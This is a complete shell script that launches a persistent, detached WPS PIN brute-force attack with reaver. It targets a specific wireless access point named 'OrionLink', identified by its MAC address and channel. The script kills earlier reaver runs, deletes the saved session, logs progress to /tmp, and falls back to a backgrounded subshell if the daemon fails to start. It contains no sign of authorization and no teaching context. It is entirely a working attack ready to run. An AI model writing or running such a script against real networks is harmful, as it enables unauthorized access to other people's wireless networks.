#!/bin/sh
# Start persistent WPS brute force (detached)
# Target: OrionLink CC:28:AA:66:30:08, Channel 2

LOG="/tmp/wps_brute.log"

# Kill any existing reaver
killall reaver 2>/dev/null
sleep 1

# Clean old session file
rm -f /etc/reaver/CC28AA663008.wpc 2>/dev/null

echo "=== Persistent WPS Brute Force ===" > "$LOG"
echo "Target: OrionLink (CC:28:AA:66:30:08) Ch2" >> "$LOG"
echo "Started: $(date)" >> "$LOG"

# Use start-stop-daemon to run reaver detached
# Pipe /dev/null to stdin so it auto-answers prompts
start-stop-daemon -S -b -x /usr/bin/reaver -- \
    -i wlan1mon -b CC:28:AA:66:30:08 -c 2 \
    -vv -d 3 -r 5:60 -N -L -T 3 -t 10 \
    -o "$LOG"

sleep 2

# Verify running
PID=$(pidof reaver)
if [ -n "$PID" ]; then
    echo "[+] Reaver running as PID $PID"
    echo "[+] Log: $LOG"
    echo "[+] Monitor with: tail -f $LOG"
else
    echo "[-] Reaver failed to start"
    echo "[-] Trying alternative method..."
    # Fallback: setsid-style via subshell
    (reaver -i wlan1mon -b CC:28:AA:66:30:08 -c 2 \
        -vv -d 3 -r 5:60 -N -L -T 3 -t 10 \
        >> "$LOG" 2>&1 < /dev/null) &
    sleep 2
    PID=$(pidof reaver)
    echo "[*] Reaver PID: $PID"
fi
